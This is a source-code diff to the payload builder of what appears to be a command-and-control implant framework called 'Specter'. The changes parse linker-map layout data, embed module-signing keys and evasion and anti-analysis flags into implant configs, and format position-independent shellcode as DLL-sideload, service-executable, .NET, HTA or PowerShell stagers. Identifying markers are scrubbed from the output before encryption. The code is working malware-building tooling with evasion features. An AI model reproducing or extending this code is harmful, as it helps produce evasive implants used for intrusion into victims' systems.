@@ -4,8 +4,11 @@ pub mod obfuscation;
 pub mod yara;
 
 pub use config_gen::{
-    generate_config, generate_config_with_evasion, generate_config_with_magic, ChannelConfig,
-    EvasionFlags, GeneratedConfig, SleepConfig, DEFAULT_CONFIG_MAGIC,
+    generate_config, generate_config_with_evasion, generate_config_with_evasion_and_magic,
+    generate_config_with_evasion_magic_and_layout,
+    generate_config_with_evasion_magic_layout_and_module_key, generate_config_with_magic,
+    ChannelConfig, EvasionFlags, GeneratedConfig, PicLayoutMetadata, SleepConfig,
+    DEFAULT_CONFIG_MAGIC,
 };
 pub use formats::{
     format_dll, format_dotnet, format_hta_stager, format_ps1_stager, format_raw,
@@ -18,7 +21,7 @@ pub use obfuscation::{
 pub use yara::{scan_payload, YaraError, YaraMatch};
 
 use std::collections::HashMap;
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
 
 use thiserror::Error;
 use x25519_dalek::PublicKey;
@@ -112,6 +115,75 @@ pub struct BuildResult {
     pub build_id: String,
 }
 
+fn parse_hex_token(token: &str) -> Option<u32> {
+    let trimmed = token.trim();
+    let hex = trimmed
+        .strip_prefix("0x")
+        .or_else(|| trimmed.strip_prefix("0X"))
+        .unwrap_or(trimmed);
+    u32::from_str_radix(hex, 16).ok()
+}
+
+fn parse_pic_layout_from_map(path: &Path) -> Result<Option<PicLayoutMetadata>, BuilderError> {
+    if !path.exists() {
+        return Ok(None);
+    }
+
+    let content = std::fs::read_to_string(path)?;
+    let mut data_start = None;
+    let mut bss_start = None;
+    let mut pdata_start = None;
+    let mut pdata_end = None;
+
+    for line in content.lines() {
+        let mut parts = line.split_whitespace();
+        let first = match parts.next() {
+            Some(first) => first,
+            None => continue,
+        };
+        let second = parts.next();
+
+        if first == ".data" && data_start.is_none() {
+            let size = parts.next().and_then(parse_hex_token).unwrap_or(0);
+            if size > 0 {
+                data_start = second.and_then(parse_hex_token);
+            }
+        } else if first == ".bss" && bss_start.is_none() {
+            let size = parts.next().and_then(parse_hex_token).unwrap_or(0);
+            if size > 0 {
+                bss_start = second.and_then(parse_hex_token);
+            }
+        } else if line.contains("__pdata_start = .") {
+            pdata_start = Some(
+                parse_hex_token(first)
+                    .ok_or_else(|| BuilderError::Config("invalid __pdata_start in map".into()))?,
+            );
+        } else if line.contains("__pdata_end = .") {
+            pdata_end = Some(
+                parse_hex_token(first)
+                    .ok_or_else(|| BuilderError::Config("invalid __pdata_end in map".into()))?,
+            );
+        }
+    }
+
+    let mutable_start = data_start.or(bss_start).unwrap_or(0);
+    let module_overload_rw_offset = mutable_start & !0xFFF;
+    let (pdata_offset, pdata_count) = match (pdata_start, pdata_end) {
+        (Some(start), Some(end)) if end > start => (start, (end - start) / 12),
+        _ => (0, 0),
+    };
+
+    if module_overload_rw_offset == 0 && pdata_offset == 0 {
+        return Ok(None);
+    }
+
+    Ok(Some(PicLayoutMetadata {
+        module_overload_rw_offset,
+        pdata_offset,
+        pdata_count,
+    }))
+}
+
 /// Payload builder: loads pre-compiled template blobs and applies binary-level
 /// transforms to produce unique implant payloads.
 pub struct PayloadBuilder {
@@ -122,6 +194,10 @@ pub struct PayloadBuilder {
     /// Entry point offset into the PIC blob (from specter.map).
     /// The stub jumps to pic_base + entry_offset.
     pic_entry_offset: u32,
+    /// Build-derived PIC layout from specter.map.
+    pic_layout: Option<PicLayoutMetadata>,
+    /// Ed25519 module signing public key to embed in generated configs.
+    module_signing_key: Option<[u8; 32]>,
 }
 
 impl PayloadBuilder {
@@ -133,9 +209,16 @@ impl PayloadBuilder {
             templates: HashMap::new(),
             template_dir: config.template_dir.clone(),
             pic_entry_offset: 0,
+            pic_layout: None,
+            module_signing_key: None,
         };
         builder.load_templates()?;
         Ok(builder)
+    }
+
+    pub fn with_module_signing_key(mut self, key: [u8; 32]) -> Self {
+        self.module_signing_key = Some(key);
+        self
     }
 
     /// Verify toolchain availability and load template blobs from disk.
@@ -180,6 +263,7 @@ impl PayloadBuilder {
         // The VMA in specter.map (e.g. 0x1020) is the PE virtual address,
         // NOT the blob offset.
         self.pic_entry_offset = 0;
+        self.pic_layout = parse_pic_layout_from_map(&self.template_dir.join("specter.map"))?;
 
         Ok(())
     }
@@ -236,6 +320,36 @@ impl PayloadBuilder {
         _skip_anti_analysis: bool,
         obfuscation_settings: &ObfuscationSettings,
     ) -> Result<BuildResult, BuilderError> {
+        self.build_with_evasion_options(
+            format,
+            profile,
+            server_pubkey,
+            channels,
+            sleep_config,
+            kill_date,
+            evasion,
+            _debug_mode,
+            _skip_anti_analysis,
+            obfuscation_settings,
+            false,
+        )
+    }
+
+    #[allow(clippy::too_many_arguments)]
+    pub fn build_with_evasion_options(
+        &self,
+        format: OutputFormat,
+        profile: &Profile,
+        server_pubkey: &PublicKey,
+        channels: &[ChannelConfig],
+        sleep_config: &SleepConfig,
+        kill_date: Option<i64>,
+        evasion: EvasionFlags,
+        debug_mode: bool,
+        skip_anti_analysis: bool,
+        obfuscation_settings: &ObfuscationSettings,
+        disable_profile: bool,
+    ) -> Result<BuildResult, BuilderError> {
         // Get the PIC blob for key derivation (implant derives key from SHA256 of first 64 bytes)
         let pic_blob = self
             .templates
@@ -250,7 +364,7 @@ impl PayloadBuilder {
 
         // Generate config with the derived magic so the AEAD AAD matches
         // what the implant will compute from CRC32(pic_base[0..64]).
-        let gen = generate_config_with_magic(
+        let gen = generate_config_with_evasion_magic_layout_and_module_key(
             profile,
             server_pubkey,
             channels,
@@ -258,7 +372,12 @@ impl PayloadBuilder {
             kill_date,
             evasion,
             pic_blob,
+            debug_mode,
+            skip_anti_analysis,
             config_magic,
+            disable_profile,
+            self.pic_layout,
+            self.module_signing_key,
         )?;
 
         let build_id = uuid::Uuid::new_v4().to_string();
@@ -297,15 +416,11 @@ impl PayloadBuilder {
             // Use the obfuscated PIC blob if available, otherwise empty.
             let pic_blob = obfuscated_pic.as_deref().unwrap_or(&[]);
             match format {
-                OutputFormat::DllSideload => {
-                    formats::format_dll(pic_blob, &gen.config_blob, None)
-                }
+                OutputFormat::DllSideload => formats::format_dll(pic_blob, &gen.config_blob, None),
                 OutputFormat::ServiceExe => {
                     formats::format_service_exe(pic_blob, &gen.config_blob, "SpecterSvc")
                 }
-                OutputFormat::DotNetAssembly => {
-                    formats::format_dotnet(pic_blob, &gen.config_blob)
-                }
+                OutputFormat::DotNetAssembly => formats::format_dotnet(pic_blob, &gen.config_blob),
                 OutputFormat::RawShellcode => unreachable!(),
             }
         };
@@ -319,8 +434,7 @@ impl PayloadBuilder {
         // controlled by compile-time SPECTER_DEV_BUILD and config TLV 0x8A.
 
         // Phase B: Scrub all remaining SPEC* markers from the final payload.
-        // This must happen AFTER config magic patching (SPECCFGM) and build
-        // flags patching (SPBF) are complete, but BEFORE XOR encryption.
+        // Config magic and build flags are no longer patched by fixed markers.
         obfuscation::finalize_payload(&mut payload);
 
         Ok(BuildResult {
@@ -470,8 +584,7 @@ impl PayloadBuilder {
                 .copy_from_slice(&(pic_blob.len() as u32).to_le_bytes());
 
             // Write entry offset (u32 LE)
-            payload[size_offset + 4..size_offset + 8]
-                .copy_from_slice(&entry_offset.to_le_bytes());
+            payload[size_offset + 4..size_offset + 8].copy_from_slice(&entry_offset.to_le_bytes());
 
             if pic_blob.len() > available {
                 // PE file's data section was truncated (zero-init optimization).
@@ -480,13 +593,14 @@ impl PayloadBuilder {
                 payload.resize(needed, 0);
                 tracing::info!(
                     "Extended PE from {} to {} bytes to fit PIC blob ({} bytes)",
-                    available + data_offset, needed, pic_blob.len()
+                    available + data_offset,
+                    needed,
+                    pic_blob.len()
                 );
             }
 
             // Copy PIC blob data
-            payload[data_offset..data_offset + pic_blob.len()]
-                .copy_from_slice(pic_blob);
+            payload[data_offset..data_offset + pic_blob.len()].copy_from_slice(pic_blob);
         } else {
             // No marker found in template -- this is an older-style stub
             // that does not support PIC embedding. Log a warning but
@@ -762,15 +876,13 @@ transform:
         let result = PayloadBuilder::embed_pic_blob(template.clone(), &pic_blob, 0).unwrap();
 
         // Size field should now contain 256
-        let embedded_size = u32::from_le_bytes([
-            result[112], result[113], result[114], result[115],
-        ]);
+        let embedded_size =
+            u32::from_le_bytes([result[112], result[113], result[114], result[115]]);
         assert_eq!(embedded_size, 256);
 
         // Entry offset should be 0 (blob offset, not PE VMA)
-        let embedded_entry = u32::from_le_bytes([
-            result[116], result[117], result[118], result[119],
-        ]);
+        let embedded_entry =
+            u32::from_le_bytes([result[116], result[117], result[118], result[119]]);
         assert_eq!(embedded_entry, 0);
 
         // PIC data should be at offset 120
@@ -786,7 +898,7 @@ transform:
         // The marker is near end of file, so there's not enough in-file space.
         // embed_pic_blob should extend the payload.
         let mut template = vec![0x00u8; 1024]; // Small PE (simulates truncated .data)
-        // Place PIC marker near the end (offset 900)
+                                               // Place PIC marker near the end (offset 900)
         template[900..912].copy_from_slice(b"SPECPICBLOB\x00");
         template[912..916].copy_from_slice(&0u32.to_le_bytes());
         template[916..920].copy_from_slice(&0u32.to_le_bytes());
@@ -796,7 +908,11 @@ transform:
         let result = PayloadBuilder::embed_pic_blob(template, &pic_blob, 0).unwrap();
 
         // File should have been extended
-        assert!(result.len() >= 920 + 8192, "PE should be extended to fit PIC blob, got {}", result.len());
+        assert!(
+            result.len() >= 920 + 8192,
+            "PE should be extended to fit PIC blob, got {}",
+            result.len()
+        );
 
         // PIC size should be written
         let pic_size = u32::from_le_bytes([result[912], result[913], result[914], result[915]]);
